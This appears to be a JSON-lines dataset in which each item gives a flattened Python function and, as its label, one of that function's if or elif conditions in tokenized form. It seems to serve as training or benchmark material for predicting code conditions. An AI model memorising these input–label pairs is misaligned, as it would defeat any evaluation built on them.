{"input": "def toPostArgs(self): \"\"\"Return all arguments with openid. in front of namespaced arguments.\"\"\" args = {} # Add namespace definitions to the output for ns_uri, alias in self.namespaces.iteritems(): if self.namespaces.isImplicit(ns_uri): continue if alias == NULL_NAMESPACE: ns_key = \"openid.ns\" else: ns_key = \"openid.ns.\" + alias args[ns_key] = ns_uri for (ns_uri, ns_key), value in self.args.iteritems(): key = self.getKey(ns_uri, ns_key) args[key] = value.encode(\"UTF-8\") return args", "label": "if self . namespaces . isImplicit ( ns_uri ) :"}
{"input": "def test_issue_530_async(self): try: rtm_client = RTMClient(token=\"I am not a token\", run_async=True) await rtm_client.start() self.fail(\"Raising an error here was expected\") except Exception as e: self.assertEqual( \"The request to the Slack API failed.\\n\" \"The server responded with: {'ok': False, 'error': 'invalid_auth'}\", str(e), ) finally: if not rtm_client._stopped: rtm_client.stop()", "label": "if not rtm_client . _stopped :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_format(d.getVarInt32()) continue if tt == 18: self.add_path(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def _iterate_files(self, files, root, include_checksums, relpath): file_list = {} for file in files: exclude = False # exclude defined filename patterns for pattern in S3Sync.exclude_files: if fnmatch.fnmatch(file, pattern): exclude = True break if not exclude: full_path = root + \"/\" + file if include_checksums: # get checksum checksum = self._hash_file(full_path) else: checksum = \"\" file_list[relpath + file] = [full_path, checksum] return file_list", "label": "if fnmatch . fnmatch ( file , pattern ) :"}
{"input": "def globs_relative_to_buildroot(self): buildroot = get_buildroot() globs = [] for bundle in self.bundles: fileset = bundle.fileset if fileset is None: continue elif hasattr(fileset, \"filespec\"): globs += bundle.fileset.filespec[\"globs\"] else: # NB(nh): filemap is an OrderedDict, so this ordering is stable. globs += [fast_relpath(f, buildroot) for f in bundle.filemap.keys()] super_globs = super().globs_relative_to_buildroot() if super_globs: globs += super_globs[\"globs\"] return {\"globs\": globs}", "label": "if fileset is None :"}
{"input": "def __getstate__(self): state = super(_ExpressionBase, self).__getstate__() for i in _ExpressionBase.__pickle_slots__: state[i] = getattr(self, i) if safe_mode: state[\"_parent_expr\"] = None if self._parent_expr is not None: _parent_expr = self._parent_expr() if _parent_expr is not None: state[\"_parent_expr\"] = _parent_expr return state", "label": "if _parent_expr is not None :"}
{"input": "def content_state_equal(v1, v2): \"Test whether two contentState structures are equal, ignoring 'key' properties\" if type(v1) != type(v2): return False if isinstance(v1, dict): if set(v1.keys()) != set(v2.keys()): return False return all(k == \"key\" or content_state_equal(v, v2[k]) for k, v in v1.items()) elif isinstance(v1, list): if len(v1) != len(v2): return False return all(content_state_equal(a, b) for a, b in zip(v1, v2)) else: return v1 == v2", "label": "if len ( v1 ) != len ( v2 ) :"}
{"input": "def process_qemu_job( file_path: str, arch_suffix: str, root_path: Path, results_dict: dict, uid: str ): result = check_qemu_executability(file_path, arch_suffix, root_path) if result: if uid in results_dict: tmp_dict = dict(results_dict[uid][\"results\"]) tmp_dict.update({arch_suffix: result}) else: tmp_dict = {arch_suffix: result} results_dict[uid] = {\"path\": file_path, \"results\": tmp_dict}", "label": "if uid in results_dict :"}
{"input": "def _eq_meet(a, b): a_dtype, b_dtype = _dtype(a), _dtype(b) if a_dtype != b_dtype: higher_dtype = dtypes.promote_types(a_dtype, b_dtype) if higher_dtype == a_dtype: a = convert_element_type(a, b_dtype) else: b = convert_element_type(b, a_dtype) return eq(a, b)", "label": "if higher_dtype == a_dtype :"}
{"input": "def _assign(self, trans, code): try: if \"-\" in code: trans.order = self.order_qs().get( code=code.rsplit(\"-\", 1)[1], event__slug__iexact=code.rsplit(\"-\", 1)[0] ) else: trans.order = self.order_qs().get(code=code.rsplit(\"-\", 1)[-1]) except Order.DoesNotExist: return JsonResponse({\"status\": \"error\", \"message\": _(\"Unknown order code\")}) else: return self._retry(trans)", "label": "if \"-\" in code :"}
{"input": "def _recalculate(self): # If the parent's path has changed, recalculate _path parent_path = tuple(self._get_parent_path()) # Make a copy if parent_path != self._last_parent_path: spec = self._path_finder(self._name, parent_path) # Note that no changes are made if a loader is returned, but we # do remember the new parent path if spec is not None and spec.loader is None: if spec.submodule_search_locations: self._path = spec.submodule_search_locations self._last_parent_path = parent_path # Save the copy return self._path", "label": "if spec . submodule_search_locations :"}
{"input": "def find_defined_variables(board_config_mks): re_def = re.compile(\"^[\\s]*([\\w\\d_]*)[\\s]*:=\") variables = dict() for board_config_mk in board_config_mks: for line in open(board_config_mk, encoding=\"latin1\"): mo = re_def.search(line) if mo is None: continue variable = mo.group(1) if variable in white_list: continue if variable not in variables: variables[variable] = set() variables[variable].add(board_config_mk[len(TOP) + 1 :]) return variables", "label": "if variable in white_list :"}
{"input": "def ensure_echo_on(): if termios: fd = sys.stdin if fd.isatty(): attr_list = termios.tcgetattr(fd) if not attr_list[3] & termios.ECHO: attr_list[3] |= termios.ECHO if hasattr(signal, \"SIGTTOU\"): old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN) else: old_handler = None termios.tcsetattr(fd, termios.TCSANOW, attr_list) if old_handler is not None: signal.signal(signal.SIGTTOU, old_handler)", "label": "if not attr_list [ 3 ] & termios . ECHO :"}
{"input": "def clean(self): with self._lock: min_index = min(self.indexes) if min_index >= self.CLEANUP_NUM: self.repository = self.repository[min_index:] for pos in xrange(len(self.indexes)): self.indexes[pos] -= min_index", "label": "if min_index >= self . CLEANUP_NUM :"}
{"input": "def generate_changes(self, old): from weblate.trans.models.change import Change tracked = ((\"slug\", Change.ACTION_RENAME_PROJECT),) for attribute, action in tracked: old_value = getattr(old, attribute) current_value = getattr(self, attribute) if old_value != current_value: Change.objects.create( action=action, old=old_value, target=current_value, project=self, user=self.acting_user, )", "label": "if old_value != current_value :"}
{"input": "def get_voices(cls): cmd = [\"flite\", \"-lv\"] voices = [] with tempfile.SpooledTemporaryFile() as out_f: subprocess.call(cmd, stdout=out_f) out_f.seek(0) for line in out_f: if line.startswith(\"Voices available: \"): voices.extend([x.strip() for x in line[18:].split() if x.strip()]) return voices", "label": "if line . startswith ( \"Voices available: \" ) :"}
{"input": "def __init__(self, *args, **kwargs): dict.__init__(self, *args, **kwargs) for key, value in self.items(): if not isinstance(key, string_types): raise TypeError(\"key must be a str, not {}\".format(type(key))) if not isinstance(value, NUMERIC_TYPES): raise TypeError(\"value must be a NUMERIC_TYPES, not {}\".format(type(value))) if not isinstance(value, float): self[key] = float(value)", "label": "if not isinstance ( value , float ) :"}
{"input": "def read_track_raw(self, redundancy=1): self._log(\"read track raw\") data = [] await self.lower.write([CMD_READ_RAW, redundancy]) while True: packet = await self.lower.read() if packet[-1] == 0xFF: raise GlasgowAppletError(\"FIFO overflow while reading track\") elif packet[-1] == 0xFE: data.append(packet[:-1]) return b\"\".join(data) else: data.append(packet)", "label": "elif packet [ - 1 ] == 0xFE :"}
{"input": "def init(self): \"\"\"Initialize from the database\"\"\" self.__effect = None if self.effectID: self.__effect = next( (x for x in self.fighter.item.effects.values() if x.ID == self.effectID), None, ) if self.__effect is None: pyfalog.error(\"Effect (id: {0}) does not exist\", self.effectID) return self.build()", "label": "if self . __effect is None :"}
{"input": "def remove(self): key = self._key if key not in _key_to_collection: raise exc.InvalidRequestError( \"No listeners found for event %s / %r / %s \" % (self.target, self.identifier, self.fn) ) dispatch_reg = _key_to_collection.pop(key) for collection_ref, listener_ref in dispatch_reg.items(): collection = collection_ref() listener_fn = listener_ref() if collection is not None and listener_fn is not None: collection.remove(self.with_wrapper(listener_fn))", "label": "if collection is not None and listener_fn is not None :"}
{"input": "def atbash(s): translated = \"\" for i in range(len(s)): n = ord(s[i]) if s[i].isalpha(): if s[i].isupper(): x = n - ord(\"A\") translated += chr(ord(\"Z\") - x) if s[i].islower(): x = n - ord(\"a\") translated += chr(ord(\"z\") - x) else: translated += s[i] return translated", "label": "if s [ i ] . isupper ( ) :"}
{"input": "def __str__(self, prefix=\"\", printElemNumber=0): res = \"\" if self.has_cost_: res += prefix + \"cost <\\n\" res += self.cost_.__str__(prefix + \" \", printElemNumber) res += prefix + \">\\n\" cnt = 0 for e in self.version_: elm = \"\" if printElemNumber: elm = \"(%d)\" % cnt res += prefix + (\"Version%s {\\n\" % elm) res += e.__str__(prefix + \" \", printElemNumber) res += prefix + \"}\\n\" cnt += 1 return res", "label": "if printElemNumber :"}
{"input": "def readwrite(obj, flags): try: if flags & select.POLLIN: obj.handle_read_event() if flags & select.POLLOUT: obj.handle_write_event() if flags & select.POLLPRI: obj.handle_expt_event() if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL): obj.handle_close() except OSError as e: if e.args[0] not in _DISCONNECTED: obj.handle_error() else: obj.handle_close() except _reraised_exceptions: raise except: obj.handle_error()", "label": "if e . args [ 0 ] not in _DISCONNECTED :"}
{"input": "def mro(cls): if self.ready: if cls.__name__ == \"B1\": B2.__bases__ = (B1,) if cls.__name__ == \"B2\": B1.__bases__ = (B2,) return type.mro(cls)", "label": "if cls . __name__ == \"B1\" :"}
{"input": "def create_hyperswap_volume(self, vol_name, size, units, pool, opts): vol_name = '\"%s\"' % vol_name params = [] if opts[\"rsize\"] != -1: is_dr_pool = self.is_volume_type_dr_pools(pool, opts) if is_dr_pool: self.check_data_reduction_pool_params(opts) params = self._get_hyperswap_volume_create_params(opts, is_dr_pool) hyperpool = \"%s:%s\" % (pool, opts[\"peer_pool\"]) self.ssh.mkvolume(vol_name, six.text_type(size), units, hyperpool, params)", "label": "if is_dr_pool :"}
{"input": "def save_new_objects(self, commit=True): self.new_objects = [] for form in self.extra_forms: if not form.has_changed(): continue # If someone has marked an add form for deletion, don't save the # object. if self.can_delete and self._should_delete_form(form): continue self.new_objects.append(self.save_new(form, commit=commit)) if not commit: self.saved_forms.append(form) return self.new_objects", "label": "if not form . has_changed ( ) :"}
{"input": "def create_monitored_items(event, dispatcher): print(\"Monitored Item\") for idx in range(len(event.response_params)): if event.response_params[idx].StatusCode.is_good(): nodeId = event.request_params.ItemsToCreate[idx].ItemToMonitor.NodeId print(\"Node {0} was created\".format(nodeId))", "label": "if event . response_params [ idx ] . StatusCode . is_good ( ) :"}
{"input": "def close(self, linger=None): if not self.closed and self._fd is not None: for event in list(chain(self._recv_futures or [], self._send_futures or [])): if not event.future.done(): try: event.future.cancel() except RuntimeError: # RuntimeError may be called during teardown pass self._clear_io_state() super(_AsyncSocket, self).close(linger=linger)", "label": "if not event . future . done ( ) :"}
{"input": "def stop_actors(self, monitor): \"\"\"Maintain the number of workers by spawning or killing as required\"\"\" if monitor.cfg.workers: num_to_kill = len(self.managed_actors) - monitor.cfg.workers for i in range(num_to_kill, 0, -1): w, kage = 0, sys.maxsize for worker in self.managed_actors.values(): age = worker.impl.age if age < kage: w, kage = worker, age self.manage_actor(monitor, w, True)", "label": "if age < kage :"}
{"input": "def get_version(module): for key in version_keys: if hasattr(module, key): version = getattr(module, key) if isinstance(version, types.ModuleType): version = get_version(version) return version return \"Unknown\"", "label": "if isinstance ( version , types . ModuleType ) :"}
{"input": "def getBigramProb(self, w1, w2): \"prob of seeing words w1 w2 next to each other.\" w1 = w1.lower() w2 = w2.lower() val1 = self.bigrams.get(w1) if val1 != None: val2 = val1.get(w2) if val2 != None: return val2 return self.addK / ( self.getUnigramProb(w1) * self.numUniqueWords + self.numUniqueWords ) return 0", "label": "if val2 != None :"}
{"input": "def _getPartAbbreviation(self): if self._partAbbreviation is not None: return self._partAbbreviation elif \"_partAbbreviation\" in self._cache: return self._cache[\"_partAbbreviation\"] else: pn = None for e in self.recurse().getElementsByClass(\"Instrument\"): pn = e.partAbbreviation if pn is None: pn = e.instrumentAbbreviation if pn is not None: break self._cache[\"_partAbbreviation\"] = pn return pn", "label": "if pn is not None :"}
{"input": "def set_value(self, value, storedtime=None): self.namespace.acquire_write_lock() try: if storedtime is None: storedtime = time.time() debug( \"set_value stored time %r expire time %r\", storedtime, self.expire_argument ) self.namespace.set_value( self.key, (storedtime, self.expire_argument, value), expiretime=self.expire_argument, ) finally: self.namespace.release_write_lock()", "label": "if storedtime is None :"}
{"input": "def setRadioSquare(self, title, square=True): if self.platform == self.MAC: gui.warn(\"Square radiobuttons not available on Mac, for radiobutton %s\", title) elif not self.ttkFlag: for k, v in self.widgetManager.group(WIDGET_NAMES.RadioButton).items(): if k.startswith(title + \"-\"): if square: v.config(indicatoron=1) else: v.config(indicatoron=0) else: gui.warn( \"Square radiobuttons not available in ttk mode, for radiobutton %s\", title )", "label": "if square :"}
{"input": "def render_func(self, node): if node.id in DEFAULT_FUNCTIONS: f = DEFAULT_FUNCTIONS[node.id] if f.sympy_func is not None and isinstance(f.sympy_func, sympy.FunctionClass): return f.sympy_func # special workaround for the \"int\" function if node.id == \"int\": return sympy.Function(\"int_\") else: return sympy.Function(node.id)", "label": "if f . sympy_func is not None and isinstance ( f . sympy_func , sympy . FunctionClass ) :"}
{"input": "def __init__(self, source_definition, **kw): super(RekallEFilterArtifacts, self).__init__(source_definition, **kw) for column in self.fields: if \"name\" not in column or \"type\" not in column: raise errors.FormatError( u\"Field definition should have both name and type.\" ) mapped_type = column[\"type\"] if mapped_type not in self.allowed_types: raise errors.FormatError(u\"Unsupported type %s.\" % mapped_type)", "label": "if mapped_type not in self . allowed_types :"}
{"input": "def run(self, lines): \"\"\"Match and store Fenced Code Blocks in the HtmlStash.\"\"\" text = \"\\n\".join(lines) while 1: m = FENCED_BLOCK_RE.search(text) if m: lang = \"\" if m.group(\"lang\"): lang = LANG_TAG % m.group(\"lang\") code = CODE_WRAP % (lang, self._escape(m.group(\"code\"))) placeholder = self.markdown.htmlStash.store(code, safe=True) text = \"%s\\n%s\\n%s\" % (text[: m.start()], placeholder, text[m.end() :]) else: break return text.split(\"\\n\")", "label": "if m :"}
{"input": "def GetDisplayNameOf(self, pidl, flags): item = pidl_to_item(pidl) if flags & shellcon.SHGDN_FORPARSING: if flags & shellcon.SHGDN_INFOLDER: return item[\"name\"] else: if flags & shellcon.SHGDN_FORADDRESSBAR: sigdn = shellcon.SIGDN_DESKTOPABSOLUTEEDITING else: sigdn = shellcon.SIGDN_DESKTOPABSOLUTEPARSING parent = shell.SHGetNameFromIDList(self.pidl, sigdn) return parent + \"\\\\\" + item[\"name\"] else: return item[\"name\"]", "label": "if flags & shellcon . SHGDN_INFOLDER :"}
{"input": "def test_buffer_play_stop(filled_buffer): assert filled_buffer.current_position[0] == 0 filled_buffer.play() for _ in range(100): assert filled_buffer.is_playing if filled_buffer.current_position[0] > 0: break else: time.sleep(0.001) else: pytest.fail(\"Did not advance position in buffer while playing.\") filled_buffer.stop() assert not filled_buffer.is_playing pos = filled_buffer.current_position for _ in range(10): assert filled_buffer.current_position == pos time.sleep(0.001)", "label": "if filled_buffer . current_position [ 0 ] > 0 :"}
{"input": "def delete_service(service): try: win32serviceutil.RemoveService(service) logger.info( \"Services: Succesfully removed service '{service}'\".format(service=service) ) except pywintypes.error as e: errors = ( winerror.ERROR_SERVICE_DOES_NOT_EXIST, winerror.ERROR_SERVICE_NOT_ACTIVE, winerror.ERROR_SERVICE_MARKED_FOR_DELETE, ) if not any(error == e.winerror for error in errors): logger.exception( \"Services: Failed to remove service '{service}'\".format(service=service) )", "label": "if not any ( error == e . winerror for error in errors ) :"}
{"input": "def connect_to_server(self, server_cls): server = client = None try: sock, port = bind_unused_port() server = server_cls(ssl_options=_server_ssl_options()) server.add_socket(sock) client = SSLIOStream(socket.socket(), ssl_options=dict(cert_reqs=ssl.CERT_NONE)) yield client.connect((\"127.0.0.1\", port)) self.assertIsNotNone(client.socket.cipher()) finally: if server is not None: server.stop() if client is not None: client.close()", "label": "if client is not None :"}
{"input": "def allow_request(self, request, view): request.server = None allow = True view_name = view.get_view_name() allowed_views = [u\"System Data\", u\"Collectd Data\", u\"Legacy System Data\"] if view_name in allowed_views: server_key = view.kwargs.get(\"server_key\") server = server_model.get_server_by_key(server_key) if server: request.server = server # Needed in the Models server_status = throttle_status(server=server) if server_status.allow == False: allow = False return allow", "label": "if server_status . allow == False :"}
{"input": "def log_start(self, prefix, msg): with self._log_lock: if self._last_log_prefix != prefix: if self._last_log_prefix is not None: self._log_file.write(\"\\n\") self._log_file.write(prefix) self._log_file.write(msg) self._last_log_prefix = prefix", "label": "if self . _last_log_prefix != prefix :"}
{"input": "def override(self, user_conf: dict): for k, v in user_conf.items(): # handle ES options, don't override entire dict if one key is passed if k == \"SEARCH_CONF\": for subkey, subval in v.items(): self.SEARCH_CONF[subkey] = subval else: setattr(self, k, v)", "label": "if k == \"SEARCH_CONF\" :"}
{"input": "def emit_classattribs(self, typebld): if hasattr(self, \"_clrclassattribs\"): for attrib_info in self._clrclassattribs: if isinstance(attrib_info, type): ci = clr.GetClrType(attrib_info).GetConstructor(()) cab = CustomAttributeBuilder(ci, ()) elif isinstance(attrib_info, CustomAttributeDecorator): cab = attrib_info.GetBuilder() else: make_decorator = attrib_info() cab = make_decorator.GetBuilder() typebld.SetCustomAttribute(cab)", "label": "elif isinstance ( attrib_info , CustomAttributeDecorator ) :"}
{"input": "def load_classes(module, base, blacklist): classes = [] for attr in dir(module): attr = getattr(module, attr) if inspect.isclass(attr): if issubclass(attr, base): if attr is not base and attr not in blacklist: classes.append(attr) return classes", "label": "if attr is not base and attr not in blacklist :"}
{"input": "def search_scopes(self, key): for scope in self.scopes: if hasattr(scope, key): return getattr(scope, key) if hasattr(scope, \"__getitem__\"): if key in scope: return scope[key]", "label": "if hasattr ( scope , key ) :"}
{"input": "def get_cfg_dict(self, with_meta=True): options_dict = self.merged_options if with_meta: if self.plugin: options_dict.update( {\"package\": \"yandextank.plugins.{}\".format(self.plugin)} ) if self.enabled is not None: options_dict.update({\"enabled\": self.enabled}) return options_dict", "label": "if self . enabled is not None :"}
{"input": "def render(self, context): for condition, nodelist in self.conditions_nodelists: if condition is not None: # if / elif clause try: match = condition.eval(context) except VariableDoesNotExist: match = None else: # else clause match = True if match: return nodelist.render(context) return \"\"", "label": "if condition is not None :"}
{"input": "def main(): base = sys.argv[1] filenames = sys.argv[2:] out = OutputByLength(base) n = 0 for filename in filenames: print(\"opening\") for record in screed.open(filename): out.save(record.name, record.sequence) n += 1 if n % 10000 == 0: print(\"...\", n)", "label": "if n % 10000 == 0 :"}
{"input": "def load_cases(full_path): all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict) for test_data in all_test_data: given = test_data[\"given\"] for case in test_data[\"cases\"]: if \"result\" in case: test_type = \"result\" elif \"error\" in case: test_type = \"error\" elif \"bench\" in case: test_type = \"bench\" else: raise RuntimeError(\"Unknown test type: %s\" % json.dumps(case)) yield (given, test_type, case)", "label": "elif \"bench\" in case :"}
{"input": "def readline(self): if self.peek is not None: return \"\" line = self.file.readline() if not line: return line if self.boundary: if line == self.boundary + \"\\n\": self.peek = line return \"\" if line == self.boundary + \"--\\n\": self.peek = line return \"\" return line", "label": "if line == self . boundary + \"--\\n\" :"}
{"input": "def _get_cache_value(self, key, empty, type): \"\"\"Used internally by the accessor properties.\"\"\" if type is bool: return key in self if key in self: value = self[key] if value is None: return empty elif type is not None: try: value = type(value) except ValueError: pass return value return None", "label": "elif type is not None :"}
{"input": "def _load_from_data(self, data): super(CliCommandHelpFile, self)._load_from_data(data) if isinstance(data, str) or not self.parameters or not data.get(\"parameters\"): return loaded_params = [] loaded_param = {} for param in self.parameters: loaded_param = next( (n for n in data[\"parameters\"] if n[\"name\"] == param.name), None ) if loaded_param: param.update_from_data(loaded_param) loaded_params.append(param) self.parameters = loaded_params", "label": "if loaded_param :"}
{"input": "def __str__(self): s = super().__str__() if self.print_suggestions: possible_keys = set(self.captured_args) - self.SPECIAL_ARGS if possible_keys: s += \"\\nPossible config keys are: {}\".format(possible_keys) return s", "label": "if possible_keys :"}
{"input": "def family_add(self, handle_list): if self.active: person = self.get_active() if person: while not self.change_person(person): pass else: self.change_person(None) else: self.dirty = True", "label": "if person :"}
{"input": "def recv_into(self, buffer, nbytes=None, flags=0): if buffer and (nbytes is None): nbytes = len(buffer) elif nbytes is None: nbytes = 1024 if self._sslobj: if flags != 0: raise ValueError( \"non-zero flags not allowed in calls to recv_into() on %s\" % self.__class__ ) tmp_buffer = self.read(nbytes) v = len(tmp_buffer) buffer[:v] = tmp_buffer return v else: return socket.recv_into(self, buffer, nbytes, flags)", "label": "if flags != 0 :"}
{"input": "def removeInsideIslands(self): self.CleanPath = [] cleanpath = Path(\"Path\") for path in self.NewPaths: for seg in path: inside = False for island in self.IntersectedIslands: issegin = island.isSegInside(seg) == 1 if issegin: if not seg in island: inside = True break if not inside: cleanpath.append(seg) cleanpath = cleanpath.split2contours() self.CleanPath.extend(cleanpath)", "label": "if not inside :"}
{"input": "def ETA(self): if self.done: prefix = \"Done\" t = self.elapsed # import pdb; pdb.set_trace() else: prefix = \"ETA \" if self.max is None: t = -1 elif self.elapsed == 0 or (self.cur == self.min): t = 0 else: # import pdb; pdb.set_trace() t = float(self.max - self.min) t /= self.cur - self.min t = (t - 1) * self.elapsed return \"%s: %s\" % (prefix, self.format_duration(t))", "label": "elif self . elapsed == 0 or ( self . cur == self . min ) :"}
{"input": "def columnToDataIndex(self, columnIndex): c = 0 for dataIndex, accessor in enumerate(self.vectorDataAccessors()): nc = accessor.numColumns() if c + nc > columnIndex: if nc == 1: return (dataIndex, -1) else: return (dataIndex, columnIndex - c) c += nc raise IndexError(columnIndex)", "label": "if nc == 1 :"}
{"input": "def as_nodes(self, files): \"\"\"Returns a list of waflib.Nodes from a list of string of file paths\"\"\" nodes = [] for x in files: if not isinstance(x, str): d = x else: d = self.srcnode.find_node(x) if not d: raise Errors.WafError(\"File '%s' was not found\" % x) nodes.append(d) return nodes", "label": "if not d :"}
{"input": "def register_extension(ext): nonlocal commands try: parser = subparsers.add_parser(ext.name) if isinstance(ext.plugin, type) and issubclass(ext.plugin, BaseCommand): # current way, class based. cmd = ext.plugin() cmd.add_arguments(parser) cmd.__name__ = ext.name commands[ext.name] = cmd.handle else: # old school, function based. commands[ext.name] = ext.plugin(parser) except Exception: logger.exception(\"Error while loading command {}.\".format(ext.name))", "label": "if isinstance ( ext . plugin , type ) and issubclass ( ext . plugin , BaseCommand ) :"}
{"input": "def names(self): ret = {} for line in dopen(\"/proc/interrupts\"): l = line.split() if len(l) <= cpunr: continue l1 = l[0].split(\":\")[0] ### Cleanup possible names from /proc/interrupts l2 = \" \".join(l[cpunr + 3 :]) l2 = l2.replace(\"_hcd:\", \"/\") l2 = re.sub(\"@pci[:\\d+\\.]+\", \"\", l2) l2 = re.sub(\"ahci\\[[:\\da-z\\.]+\\]\", \"ahci\", l2) ret[l1] = l2 return ret", "label": "if len ( l ) <= cpunr :"}
{"input": "def formatweekday(self, day, width): with TimeEncoding(self.locale) as encoding: if width >= 9: names = day_name else: names = day_abbr name = names[day] if encoding is not None: name = name.decode(encoding) return name[:width].center(width)", "label": "if encoding is not None :"}
{"input": "def __walk_dir_tree(self, dirname): dir_list = [] self.__logger.debug(\"__walk_dir_tree. START dir=%s\", dirname) for f in os.listdir(dirname): current = os.path.join(dirname, f) if os.path.isfile(current) and f.endswith(\"py\"): if self.module_registrant: self._load_py_from_file(current) dir_list.append(current) elif os.path.isdir(current): ret = self.__walk_dir_tree(current) if ret: dir_list.append((f, ret)) return dir_list", "label": "if os . path . isfile ( current ) and f . endswith ( \"py\" ) :"}
{"input": "def _EvalInScriptedSection(self, codeBlock, globals, locals=None): if self.debugManager: self.debugManager.OnEnterScript() if self.debugManager.adb.appDebugger: return self.debugManager.adb.runeval(codeBlock, globals, locals) else: return eval(codeBlock, globals, locals) else: return eval(codeBlock, globals, locals)", "label": "if self . debugManager . adb . appDebugger :"}
{"input": "def load_multiple(fh, position=None, end=None): loaded = list() while position < end: new_box = load(fh, position, end) if new_box is None: print(\"Error, failed to load box.\") return None loaded.append(new_box) position = new_box.position + new_box.size() return loaded", "label": "if new_box is None :"}
{"input": "def test_loadTestsFromName__module_not_loaded(self): # We're going to try to load this module as a side-effect, so it # better not be loaded before we try. # module_name = \"unittest2.test.dummy\" sys.modules.pop(module_name, None) loader = unittest2.TestLoader() try: suite = loader.loadTestsFromName(module_name) self.assertIsInstance(suite, loader.suiteClass) self.assertEqual(list(suite), []) # module should now be loaded, thanks to loadTestsFromName() self.assertIn(module_name, sys.modules) finally: if module_name in sys.modules: del sys.modules[module_name]", "label": "if module_name in sys . modules :"}
{"input": "def copy_file(s, d, xform=None): with open(s, \"rb\") as f: text = f.read() if xform: (d, text) = xform(d, text) if os.path.exists(d): if opts.force: print >>sys.stderr, \"Overwriting %s.\" % d else: print >>sys.stderr, \"Not overwriting %s.\" % d return else: print >>sys.stderr, \"Writing %s.\" % d with open(d, \"wb\") as f: f.write(text)", "label": "if opts . force :"}
{"input": "def __setitem__(self, index, image): if isinstance(index, slice): tmp_idx = self.current_index slice_ = self.validate_slice(index) del self[slice_] self.extend(image, offset=slice_.start) self.current_index = tmp_idx else: if not isinstance(image, BaseImage): raise TypeError( \"image must be an instance of wand.image.\" \"BaseImage, not \" + repr(image) ) with self.index_context(index) as index: library.MagickRemoveImage(self.image.wand) library.MagickAddImage(self.image.wand, image.wand)", "label": "if not isinstance ( image , BaseImage ) :"}
{"input": "def _configure_legacy_instrument_class(self): if self.inherits: self.dispatch._update(self.inherits.dispatch) super_extensions = set( chain(*[m._deprecated_extensions for m in self.inherits.iterate_to_root()]) ) else: super_extensions = set() for ext in self._deprecated_extensions: if ext not in super_extensions: ext._adapt_instrument_class(self, ext)", "label": "if ext not in super_extensions :"}
{"input": "def tearDown(self): exc, _, _ = sys.exc_info() if exc: try: if hasattr(self, \"obj\") and isinstance(self.obj, SelfDiagnosable): diags = self.obj.get_error_diagnostics() if diags: for line in diags: ROOT_LOGGER.info(line) except BaseException: pass if self.captured_logger: self.captured_logger.removeHandler(self.log_recorder) self.log_recorder.close() sys.stdout = self.stdout_backup super(BZTestCase, self).tearDown()", "label": "if hasattr ( self , \"obj\" ) and isinstance ( self . obj , SelfDiagnosable ) :"}
{"input": "def number_operators(self, a, b, skip=[]): dict = {\"a\": a, \"b\": b} for name, expr in self.binops.items(): if name not in skip: name = \"__%s__\" % name if hasattr(a, name): res = eval(expr, dict) self.binop_test(a, b, res, expr, name) for name, expr in list(self.unops.items()): if name not in skip: name = \"__%s__\" % name if hasattr(a, name): res = eval(expr, dict) self.unop_test(a, res, expr, name)", "label": "if name not in skip :"}
{"input": "def _parse_cachecontrol(self, r): if r not in self._cc_parsed: cch = r.headers.get(b\"Cache-Control\", b\"\") parsed = parse_cachecontrol(cch) if isinstance(r, Response): for key in self.ignore_response_cache_controls: parsed.pop(key, None) self._cc_parsed[r] = parsed return self._cc_parsed[r]", "label": "if isinstance ( r , Response ) :"}
{"input": "def make_pattern(wtree): subpattern = [] for part in wtree[1:-1]: if isinstance(part, list): part = make_pattern(part) elif wtree[0] != \"\": for c in part: # Meta-characters cannot be quoted if c in special_chars: raise GlobError() subpattern.append(part) return \"\".join(subpattern)", "label": "elif wtree [ 0 ] != \"\" :"}
{"input": "def iterjlines(f, header, missing): it = iter(f) if header is None: header = list() peek, it = iterpeek(it, 1) json_obj = json.loads(peek) if hasattr(json_obj, \"keys\"): header += [k for k in json_obj.keys() if k not in header] yield tuple(header) for o in it: json_obj = json.loads(o) yield tuple(json_obj[f] if f in json_obj else missing for f in header)", "label": "if hasattr ( json_obj , \"keys\" ) :"}
{"input": "def logprob(self, sample): if self._log: return self._prob_dict.get(sample, _NINF) else: if sample not in self._prob_dict: return _NINF elif self._prob_dict[sample] == 0: return _NINF else: return math.log(self._prob_dict[sample], 2)", "label": "elif self . _prob_dict [ sample ] == 0 :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: length = d.getVarInt32() tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length) d.skip(length) self.add_public_certificate_list().TryMerge(tmp) continue if tt == 16: self.set_max_client_cache_time_in_second(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def acquire(self, blocking=True, timeout=None): if not blocking and timeout is not None: raise ValueError(\"can't specify timeout for non-blocking acquire\") rc = False endtime = None self._cond.acquire() while self._value == 0: if not blocking: break if timeout is not None: if endtime is None: endtime = _time() + timeout else: timeout = endtime - _time() if timeout <= 0: break self._cond.wait(timeout) else: self._value = self._value - 1 rc = True self._cond.release() return rc", "label": "if not blocking :"}
{"input": "def run_train_loop(self): self.begin_training() for _ in self.yield_train_step(): if self.should_save_model(): self.save_model() if self.should_save_checkpoint(): self.save_checkpoint() if self.should_eval_model(): self.eval_model() if self.should_break_training(): break self.eval_model() self.done_training() return self.returned_result()", "label": "if self . should_eval_model ( ) :"}
{"input": "def scrape_me(url_path, **options): host_name = ( get_host_name(url_path) if not options.get(\"test\", False) else \"test_wild_mode\" ) try: scraper = SCRAPERS[host_name] except KeyError: if options.get(\"wild_mode\", False): wild_scraper = SchemaScraperFactory.generate(url_path, **options) if not wild_scraper.schema.data: raise NoSchemaFoundInWildMode(url_path) return wild_scraper else: raise WebsiteNotImplementedError(host_name) return scraper(url_path, **options)", "label": "if options . get ( \"wild_mode\" , False ) :"}
